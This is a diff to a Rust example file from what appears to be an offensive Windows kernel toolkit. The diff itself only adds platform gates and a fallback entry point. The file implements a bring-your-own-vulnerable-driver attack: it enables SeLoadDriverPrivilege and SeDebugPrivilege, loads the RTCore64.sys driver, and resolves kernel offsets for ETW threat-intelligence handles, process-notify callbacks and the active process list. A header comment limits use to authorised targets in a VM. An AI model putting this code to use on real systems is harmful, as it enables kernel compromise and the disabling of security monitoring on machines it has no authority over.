@@ -18,17 +18,22 @@
 //! # Safety
 //! 加载驱动进内核（不可逆，直到 unload）。仅在授权目标 + VM 上运行。
 
-#![cfg(target_os = "windows")]
 
+
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::byovd::resolve_kernel_symbol;
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::etwti::EtwTiOffsets;
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::win::{bootstrap_byovd, kernel_base};
 // trait 方法 (kread/kread_u64) 必须在 scope 内才能在 ByovdDriver 上调用。
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::KernelRw;
 // ntdll!RtlAdjustPrivilege — 启用 token 特权。原型:
 //   NTSTATUS RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable,
 //                               BOOLEAN CurrentThread, PBOOLEAN Enabled)
 // SeLoadDriverPrivilege 的 LUID 恒为 10 (nt!SE_LOAD_DRIVER_PRIVILEGE)。
+#[cfg(target_os = "windows")]
 extern "system" {
     fn RtlAdjustPrivilege(
         privilege: u32,
@@ -41,6 +46,7 @@ extern "system" {
 /// 启用 SeLoadDriverPrivilege (LUID 10)。管理员 token 默认 disabled，
 /// NtLoadDriver 不启用它返回 STATUS_PRIVILEGE_NOT_HELD (0xC0000061)。
 /// 同时启用 SeDebugPrivilege (20) —— 后续 I/J/K 的内核读需要它。
+#[cfg(target_os = "windows")]
 fn enable_privileges() {
     for (luid, name) in [
         (10u32, "SeLoadDriverPrivilege"),
@@ -69,6 +75,7 @@ fn enable_privileges() {
 /// rejected on some builds (Server 2019 17763 → STATUS_INVALID_IMAGE_FORMAT
 /// 0xC0000160). The driver file is also copied to
 /// `C:\Windows\System32\drivers\RTCore64.sys`.
+#[cfg(target_os = "windows")]
 const SYS_PATH: &[u16] = &[
     'S' as u16,
     'y' as u16,
@@ -102,11 +109,13 @@ const SYS_PATH: &[u16] = &[
     0,
 ];
 /// 服务名 `RTCore64`（不含 NUL —— bootstrap 会补）。
+#[cfg(target_os = "windows")]
 const SVC_NAME: &[u16] = &[
     'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
 ];
 
 /// 读取 ntoskrnl 镜像的字节数。17763 ntoskrnl ~9MB；读 10MB 留余量。
+#[cfg(target_os = "windows")]
 const NTOSKRNL_READ_SIZE: usize = 10 * 1024 * 1024;
 
 /// ntoskrnl 符号 RVA —— 本机 build 17763.1339，PDB GUID
@@ -115,6 +124,7 @@ const NTOSKRNL_READ_SIZE: usize = 10 * 1024 * 1024;
 /// 用 dbghelp + 从 MS 符号服务器下载的 ntkrnlmp.pdb 解析 (sym_lookup.ps1)。
 /// PspCreateProcessNotifyRoutine=0x4D9D70 与 offsets.rs 文档记载完全吻合，证明解析正确。
 /// 这些值**仅本 build 有效**——换机/换补丁必须重新解析。
+#[cfg(target_os = "windows")]
 mod rva {
     pub const ETW_THREAT_INT_PROV_REG_HANDLE: u32 = 0x40A6B0;
     pub const PSP_CREATE_PROCESS_NOTIFY_ROUTINE: u32 = 0x4D9D70;
@@ -123,6 +133,7 @@ mod rva {
     pub const PS_ACTIVE_PROCESS_HEAD: u32 = 0x40E5C0;
 }
 
+#[cfg(target_os = "windows")]
 fn main() {
     println!(
         "[bootstrap_test] start (pid={}, integrity check via whoami /groups)",
@@ -281,4 +292,24 @@ fn main() {
     println!("\n[bootstrap_test] DONE — driver stays loaded for tasks I/J/K.");
     // 不主动 unload —— I/J/K 复用同一个驱动。
     std::mem::forget(loaded);
+}
+
+
+// ----------------------------------------------------------------------------
+// Non-Windows entry-point fallback (E0601 mitigation).
+//
+// The real `fn main()` (and every Windows-only item above) is gated by
+// `#[cfg(target_os = "windows")]`. This file is compiled as an example crate,
+// which requires a `main` entry point; on macOS/Linux dev hosts the Windows
+// body compiles to nothing and the build would fail with E0601 ("main
+// function not found"). This stub exists solely to satisfy the crate root on
+// non-Windows so `cargo build --examples` / `cargo test` stay green. It is
+// mutually exclusive with the Windows `main` above and never runs on target.
+// ----------------------------------------------------------------------------
+#[cfg(not(target_os = "windows"))]
+fn main() {
+    eprintln!(
+        "{} is a Windows-only kernel example (BYOVD driver load). It has no          effect on non-Windows hosts.",
+        env!("CARGO_BIN_NAME")
+    );
 }
